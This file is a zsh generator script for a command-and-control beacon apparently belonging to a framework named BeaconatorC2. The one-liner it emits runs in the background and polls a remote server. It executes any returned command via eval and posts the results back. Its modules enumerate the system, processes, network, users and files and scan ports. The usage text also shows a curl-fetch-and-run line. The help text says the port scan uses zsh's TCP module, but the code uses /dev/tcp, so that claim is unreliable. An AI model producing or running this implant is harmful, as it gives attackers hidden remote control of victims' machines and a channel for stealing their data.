#!/bin/zsh
#
# zsh One-Liner Beacon for BeaconatorC2
# A minimal shell-based beacon optimized for zsh (default on macOS 10.15+)
# Supports HTTP communication with the BeaconatorC2 framework
#

# Configuration (modify these variables)
DEFAULT_SERVER="127.0.0.1"
DEFAULT_PORT="8080"
DEFAULT_ENDPOINT="/"
DEFAULT_INTERVAL="15"

# Function to generate the one-liner beacon for zsh
generate_oneliner() {
    local server="${1:-$DEFAULT_SERVER}"
    local port="${2:-$DEFAULT_PORT}"
    local endpoint="${3:-$DEFAULT_ENDPOINT}"
    local interval="${4:-$DEFAULT_INTERVAL}"
    
    cat << 'ONELINER'
zsh -c '"'"'(S="${SERVER:-127.0.0.1}";P="${PORT:-8080}";E="${ENDPOINT:-/}";I="${INTERVAL:-15}";ID=$(echo -n "$(hostname -s)$(whoami)$(date +%s)$$" | md5 2>/dev/null | cut -c1-8 2>/dev/null || echo "$(hostname -s)$(whoami)" | cut -c1-8);URL="http://$S:$P$E";curl -s -X POST "$URL" -H "User-Agent: ZshBeacon/$ID" -d "register|$ID|$(hostname -s)" >/dev/null 2>&1;while true;do CMD=$(curl -s -X POST "$URL" -H "User-Agent: ZshBeacon/$ID" -d "request_action|$ID" 2>/dev/null);if [[ "$CMD" != "no_pending_commands" ]] && [[ -n "$CMD" ]] && [[ "$CMD" != ERROR* ]];then if [[ "$CMD" == "shutdown" ]];then OUT="=== CLEANUP ==="$'"'"'\n'"'"'"Stopping beacon and cleaning up..."$'"'"'\n'"'"';curl -s -X POST "$URL" -H "User-Agent: ZshBeacon/$ID" -d "command_output|$ID|$OUT" >/dev/null 2>&1;break;elif [[ "$CMD" == execute_command\|* ]];then OUT=$(eval "${CMD#execute_command|}" 2>&1);elif [[ "$CMD" == execute_module\|* ]];then MOD=$(echo "$CMD" | cut -d'"'"'|'"'"' -f2);PARAMS=$(echo "$CMD" | cut -d'"'"'|'"'"' -f3-);case "$MOD" in SystemInfo)OUT="=== SYSTEM INFO ==="$'"'"'\n'"'"'"Hostname: $(hostname -s)"$'"'"'\n'"'"'"User: $(whoami)"$'"'"'\n'"'"'"UID: $(id -u)"$'"'"'\n'"'"'"Groups: $(id -Gn 2>/dev/null | tr '"'"' '"'"' '"'"','"'"')"$'"'"'\n'"'"'"OS: $(sw_vers 2>/dev/null || uname -a)"$'"'"'\n'"'"'"Uptime: $(uptime)"$'"'"'\n'"'"'"Shell: $SHELL"$'"'"'\n'"'"'"PWD: $(pwd)"$'"'"'\n'"'"'"PID: $$"$'"'"'\n'"'"'"PPID: $PPID"$'"'"'\n'"'"'"Zsh Version: ${ZSH_VERSION:-Not Available}";; ProcessEnum)OUT="=== PROCESS ENUMERATION ==="$'"'"'\n'"'"'"$(ps aux 2>/dev/null | head -50)";; NetworkEnum)OUT="=== NETWORK ENUMERATION ==="$'"'"'\n'"'"'"Interfaces:"$'"'"'\n'"'"'"$(ifconfig 2>/dev/null | grep -E '"'"'^[a-z]|inet '"'"' || echo '"'"'Network tools not available'"'"')"$'"'"'\n\n'"'"'"Connections:"$'"'"'\n'"'"'"$(netstat -an 2>/dev/null | grep -E '"'"'tcp|udp'"'"' | grep -E '"'"'LISTEN|ESTABLISHED'"'"' | head -20 || echo '"'"'Cannot enumerate connections'"'"')";; UserEnum)OUT="=== USER ENUMERATION ==="$'"'"'\n'"'"'"Current User: $(whoami) (UID: $(id -u))"$'"'"'\n'"'"'"Groups: $(id -Gn 2>/dev/null || echo '"'"'Cannot get groups'"'"')"$'"'"'\n'"'"'"Sudo Check: $(sudo -n true 2>/dev/null && echo '"'"'SUDO ACCESS'"'"' || echo '"'"'No sudo access'"'"')"$'"'"'\n'"'"'"Home Dir: $HOME"$'"'"'\n'"'"'"Local Users:"$'"'"'\n'"'"'"$(dscl . -list /Users 2>/dev/null | grep -v '"'"'^_'"'"' | head -20 || echo '"'"'Cannot enumerate users'"'"')";; FileSearch)DIR=$(echo "$PARAMS" | cut -d'"'"','"'"' -f1);PATTERN=$(echo "$PARAMS" | cut -d'"'"','"'"' -f2);OUT="=== FILE SEARCH ==="$'"'"'\n'"'"'"Searching for '"'"'$PATTERN'"'"' in '"'"'$DIR'"'"'"$'"'"'\n'"'"'"$(find "${DIR:-/tmp}" -name "*${PATTERN:-txt}*" -type f 2>/dev/null | head -50 || echo '"'"'Search failed or no results'"'"')";; PortScan)TARGET=$(echo "$PARAMS" | cut -d'"'"','"'"' -f1);PORTS=$(echo "$PARAMS" | cut -d'"'"','"'"' -f2);OUT="=== PORT SCAN ==="$'"'"'\n'"'"'"Scanning ${TARGET:-127.0.0.1} for ports: ${PORTS:-22,80,443}"$'"'"'\n'"'"';for port in $(echo "${PORTS:-22,80,443}" | tr '"'"','"'"' '"'"' '"'"');do (echo >/dev/tcp/${TARGET:-127.0.0.1}/$port) >/dev/null 2>&1 && OUT="$OUT$port: OPEN"$'"'"'\n'"'"' || OUT="$OUT$port: CLOSED"$'"'"'\n'"'"';done;; ZshFeatures)OUT="=== ZSH FEATURES ==="$'"'"'\n'"'"'"Zsh Version: ${ZSH_VERSION:-Not Available}"$'"'"'\n'"'"'"Shell: $SHELL"$'"'"'\n'"'"'"History Size: ${HISTSIZE:-Not Set}"$'"'"'\n'"'"'"Options: $(setopt 2>/dev/null | head -5 | tr '"'"'\n'"'"' '"'"','"'"' || echo '"'"'Not Available'"'"')"$'"'"'\n'"'"'"Loaded Modules: $(zmodload 2>/dev/null | head -5 | tr '"'"'\n'"'"' '"'"','"'"' || echo '"'"'Not Available'"'"')";; Cleanup)OUT="=== CLEANUP ==="$'"'"'\n'"'"'"Stopping beacon and cleaning up..."$'"'"'\n'"'"';curl -s -X POST "$URL" -H "User-Agent: ZshBeacon/$ID" -d "command_output|$ID|$OUT" >/dev/null 2>&1;break;; *)OUT="ERROR: Unknown module '"'"'$MOD'"'"'";; esac;else OUT=$(eval "$CMD" 2>&1);fi;curl -s -X POST "$URL" -H "User-Agent: ZshBeacon/$ID" -d "command_output|$ID|$OUT" >/dev/null 2>&1;fi;sleep "$I";done) &'"'"''
ONELINER
}

# Function to generate customized one-liner
generate_custom_oneliner() {
    local server="${1:-$DEFAULT_SERVER}"
    local port="${2:-$DEFAULT_PORT}"
    local endpoint="${3:-$DEFAULT_ENDPOINT}"
    local interval="${4:-$DEFAULT_INTERVAL}"
    
    # Replace placeholders in the one-liner
    generate_oneliner | sed "s/\${SERVER:-127.0.0.1}/\${SERVER:-$server}/g" | \
                       sed "s/\${PORT:-8080}/\${PORT:-$port}/g" | \
                       sed "s/\${ENDPOINT:-\/}/\${ENDPOINT:-$(echo "$endpoint" | sed 's/\//\\\//g')}/g" | \
                       sed "s/\${INTERVAL:-15}/\${INTERVAL:-$interval}/g"
}

# Function to show usage
show_usage() {
    cat << EOF
zsh One-Liner Beacon Generator for BeaconatorC2

Usage: $0 [OPTIONS]

OPTIONS:
    -h, --help              Show this help message
    -s, --server SERVER     Server IP/hostname (default: $DEFAULT_SERVER)
    -p, --port PORT         Server port (default: $DEFAULT_PORT)
    -e, --endpoint PATH     HTTP endpoint (default: $DEFAULT_ENDPOINT)
    -i, --interval SECONDS  Check-in interval (default: $DEFAULT_INTERVAL)
    -g, --generate          Generate default one-liner
    -c, --custom            Generate custom one-liner with provided options

Examples:
    # Generate default one-liner
    $0 --generate

    # Generate custom one-liner for specific server
    $0 --custom --server 192.168.1.100 --port 8080

    # Execute the one-liner directly (for testing)
    SERVER=192.168.1.100 PORT=8080 zsh -c "\$(curl -s http://192.168.1.100/beacon.sh)"

Core Modules Supported:
    - SystemInfo: System information using macOS and zsh-specific commands
    - ProcessEnum: Running process enumeration
    - NetworkEnum: Network interface and connection info
    - UserEnum: User enumeration using dscl
    - FileSearch: Search for files by pattern
    - PortScan: TCP port scanning using zsh's built-in TCP module
    - ZshFeatures: zsh-specific information and features
    - Cleanup: Stop beacon and cleanup

zsh-Specific Features:
    - Uses zsh's built-in TCP module for port scanning (zsh/net/tcp)
    - Leverages zsh parameter expansion features
    - Includes zsh version and module information
    - Optimized for zsh's array handling and string processing
    - Uses zsh's enhanced glob patterns

The one-liner runs in the background and communicates with BeaconatorC2 via HTTP POST requests.
EOF
}

# Main execution
main() {
    local server="$DEFAULT_SERVER"
    local port="$DEFAULT_PORT"
    local endpoint="$DEFAULT_ENDPOINT" 
    local interval="$DEFAULT_INTERVAL"
    local action=""

    while [[ $# -gt 0 ]]; do
        case $1 in
            -h|--help)
                show_usage
                exit 0
                ;;
            -s|--server)
                server="$2"
                shift 2
                ;;
            -p|--port)
                port="$2"
                shift 2
                ;;
            -e|--endpoint)
                endpoint="$2"
                shift 2
                ;;
            -i|--interval)
                interval="$2"
                shift 2
                ;;
            -g|--generate)
                action="generate"
                shift
                ;;
            -c|--custom)
                action="custom"
                shift
                ;;
            *)
                echo "Unknown option: $1"
                show_usage
                exit 1
                ;;
        esac
    done

    case "$action" in
        generate)
            echo "# Default zsh One-Liner Beacon"
            echo "# Copy and paste the following line into a zsh terminal:"
            echo ""
            generate_oneliner
            echo ""
            ;;
        custom)
            echo "# Custom zsh One-Liner Beacon"
            echo "# Server: $server:$port$endpoint"
            echo "# Interval: $interval seconds"
            echo "# Copy and paste the following line into a zsh terminal:"
            echo ""
            generate_custom_oneliner "$server" "$port" "$endpoint" "$interval"
            echo ""
            ;;
        *)
            show_usage
            ;;
    esac
}

# Run main function if script is executed directly
if [[ "${ZSH_ARGZERO:t}" == "${0:t}" ]]; then
    main "$@"
fi